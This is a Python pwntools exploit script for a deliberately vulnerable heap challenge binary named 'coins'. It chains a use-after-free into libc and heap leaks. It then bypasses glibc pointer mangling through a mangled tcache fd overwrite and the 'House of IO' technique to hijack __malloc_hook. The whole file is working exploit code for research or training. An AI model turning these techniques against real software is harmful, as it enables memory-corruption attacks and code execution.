'''
Using the ptr mangling mitigations and bypassing them. 

This file has two different solutions: 
- Using heap leak then altering the fd ptr as normal (just with mangling) 
- House of IO 

Eventually, these will be split into two different challenges AND/or IO 
will be removed. But, we'll see! :) 
'''

from pwn import * 
import os
import mangle

mode = 'DEBUG' # Turn on gdb
libc_name = '/home/strikeout/Desktop/research/protections/libc.so.6' # For alternate version of libc

env = {}

# Binary setup
elf_name = 'coins'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(['/home/strikeout/Desktop/research/protections/ld-linux-x86-64.so.2',elf.path],env=env)
	gdb.attach(p, 'dir ./') 
else: 
	p = process(elf.path, env=env) 

'''
Selects a coin at a given index 
Parameters: 
	- index: The coin to select 
'''
def select(index): 
	p.sendlineafter(">", "1") 
	p.sendlineafter(":", str(index)) 

''' 
Makes a coin
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def make(head, tail, value): 
	p.sendlineafter(">", "2") 
	p.sendlineafter(":", str(head))
	p.sendlineafter(":", str(tail)) 
	p.sendlineafter(":", str(value)) 

'''
Makes a coin
'''
def make_tmp(): 
	p.sendlineafter(">", "2") 

'''
Edits a coin -- Assumes the proper coin is already 'selected'
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def edit(head, tail, value): 
	p.sendlineafter(">", "3") 
	p.sendlineafter(":", str(head)) 
	p.sendlineafter(":", str(tail)) 
	p.sendlineafter(":", str(value)) 

'''
Prints the contents of a coin  -- Assumes the proper coin is already 'selected'
Returns: 
	- Coin: Index 0 is the head, index 1 is the tail and index 2 is 
	        the value. 
'''
def see():
	p.sendlineafter(">", "4") 
	p.recvuntil("Head Design: ") 
	head = p.recvuntil("Tail Design: ").replace("\nTail Design: ", "") 
	tail = p.recvuntil("Worth: ").replace("\nWorth: ", "") 
	value = p.recvuntil("Options").replace("\nOptions","")
	return head, tail, int(value)



''' 
Removes a coin -- Assumes the proper coin is already 'selected'
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def remove(): 
	p.sendlineafter(">", "5") 

# Uses a LibC leak
# Index 0 has an assumed UAF at this point.
def defeat(libc_base):
	heap_base = heap_leak()
	fake_tcache_fd(libc_base, heap_base) 	
	reg_code_exec() 

# Index 0 has an assumed UAF at this point.
def heap_leak():
	'''
	The beginning is getting a heap leak. The unsorted bin has TWO 
	entries. The 'tail_desc' ptr is the last item in the unsorted
	bin. So, the 'fd' ptr of the unsorted bin chunk has a ptr to 
	the heap that we can use to break the mangle pointers ourselves.
	'''
	heap_offset = 0x22f0 # Offset to get heap base

	# The 'tail' text points to a free unsorted bin chunk. Heap leak
	_, heap_leak, _ = see()
	heap_leak = u64(heap_leak + "\x00" * 2)
	heap_base = heap_leak - heap_offset
	print "Heap Base: ", hex(heap_base) 
	return heap_base

# Set the fake fd of a tcache bin and fix unsorted bin
def fake_tcache_fd(libc_base, heap_base):

	tcache_fd_loc_offset = 0x290 # Location where mangled ptr is stored
	'''
	The fd ptr has to be mangled with the storage location. From 
	using the same allocation series everytime, we know where
	this will be stored at. 

	The fd ptr is being set to __malloc_hook so that we can alter 
	the contents at __malloc_hook to get code execution.
	'''
	storage_location = heap_base + tcache_fd_loc_offset
	fd_ptr = libc.symbols['__malloc_hook']
	mangled_malloc_hook = mangle.encode_ptr(fd_ptr, storage_location) 
	print "Mangled Malloc Hook:", hex(mangled_malloc_hook) 

	'''
	Used in a prior version of coins.c. If the null feature is removed
	then this code needs to be added back in 

	# Tail holds a ptr in the unsorted bin. We need to repair this in order
	# For the allocation to happen properly. Just use the same values that were there previously
	unsorted_bin_fd_offset = 0x22f0  # Just to fix chunk
	unsorted_bin_bk_offset = 0x1bdbe0 # Just to fix chunk
	old_fd = heap_base + unsorted_bin_fd_offset
	old_bk = libc_base + unsorted_bin_bk_offset
	tail = p64(old_fd) 
	tail += p64(old_bk) 
	tail += p64(0x0) * 2 # NULL out fd_nextsize & bk_nextsize

	'''
	# Edit the tcache fd ptr to get a ptr to __malloc_hook to be returned	
	edit("", "", mangled_malloc_hook) 

def reg_code_exec():
	# The 'value' now points to __malloc_hook! :) 
	# One gadget is not working on this build of LibC? 
	# Could attempt to run system from __free_hook, if we wanted. But, I'll let this go for now.
	make("A", "B", 9)

	# 0x4141414141 is supposed to be replaced to control code execution
	make("PWNed", "like migitgations aren't here", 0x414141414141) 

	# Next call to malloc does big and bad things!


def io(): 
	overwrite_tcache() 
	io_code_exec() 

# Used to bypass the mangling by editing the tcache data structures!
# Assumes a libc leak but does not require a heap leak 
def overwrite_tcache():
	'''
	TCache section is made up of a struct that looks like the following:
	 - uint16_t counts[TCACHE_MAX_BINS]; <-- TCACHE_MAX_BINS is default 64
	 - tcache_entry *entries[TCACHE_MAX_BINS];

	So, the first item is an array of 2 byte integers to represent 
	the amount of items in a given bin. 64 * 2 = 128 bytes
	
	The second item is a list of pointers, which are 8 bytes per
	ptr. SO, there is 64 * 8 = 512 bytes


	Our goal is to bypass the ptr mangling by altering the tcache 
	structures themselves! This is to do without a normal ptr 
	overwrite because the second field of the tcache is 'key',
	which points to the beginning of the tcache!
	'''

	# Try to keep the tcache in as normal shape as possible.

	'''
	The struct for a coin is held in at the first tcache bin. 
	So, we going to set the amount of entries in the tcache
	bin in order to each the ptrs. If null bytes were allowed,
	we'd want to set the first bin to 0x2 and the rest to 0x0 
	'''
	fake_tcache = "A" * 2 * 64 

	'''
	Set the first bin ptr holder for the tcache to __malloc_hook.
	'''
	fake_tcache += p64(libc.symbols['__malloc_hook'] ) 

	'''
	Use the head field (dereferences a pointer to 'key') to write
	to the tcache. 

	For the tail, enter nothing so that the heap ptrs do not get 
	altered. 
	'''
	edit(fake_tcache, "", 0x0) 


def io_code_exec():	

	# Function ptr to jump to. Could use one_gadget (if this worked?) 
	# Or, change location to _free_hook and call 'system' instead.
	# Or ROP! :) 
	func = 0x4141414141
	make("PWNed", "f0r-L1F3", func)
	

def get_libc_leak(): 

	'''
	The vulnerability is a use after free on the currently 
	selected coin, once it has been freed. 
	'''
	# Create 3 coins. Index 0,1,2. 
	make("A" * 8, "B" * 8, 8) 
	make("C" * 8, "D" * 8, 9) 
	make("E" * 8, "F" * 8, 10) 

	# Create a UAF on coin 1 in order to get nice leaks from LibC. 
	select(1) 
	remove() 

	'''
	Returns in the following order: head, tail, coin value. 
	The head points to a useless field but the tail points to 
	a chunk that is in the unsorted bin (from the free). 
	
	Because this is the only entry in the unsorted bin, 
	both the fd and bk fields are pointers to the unsorted_bin 
	itself (aka, a libc ptr). 

	So, we read this to get a LibC leak. 
	'''
	_, libc_leak, heap_managled = see()
	libc_offset = 0x1bdbe0
	libc_base = u64(libc_leak + "\x00\x00") - libc_offset
	print "LibC Base: ", hex(libc_base)
	libc.address = libc_base 
	return libc_base

# Get UAF on fd ptr and ability to write to the TCache itself
def edit_fd_uaf(): 
	'''
	There's a UAF on coins only after they have just been deleted
	via the lack of a ptr being cleared. 
	
	There is currently one item in the 0x20 tcache (bin 0). 
	If we free another one, we will have a ptr to the TOP of the 
	bin with the count of the bin being at 2. 

	So, we this allows for a trivial overwrite of the fd ptr and 
	puts 'key' (double free check that points to the beginning of 
	the tcache) in the second slot. 
	'''
	# Create a UAF on coin 0 to leak heap address. 
	select(0) 
	remove()

# Sets LibC as the libc.address in order to just reference the ELF for symbols. 
libc_base = get_libc_leak()
edit_fd_uaf()


#defeat(libc_base) 
io()
p.interactive()
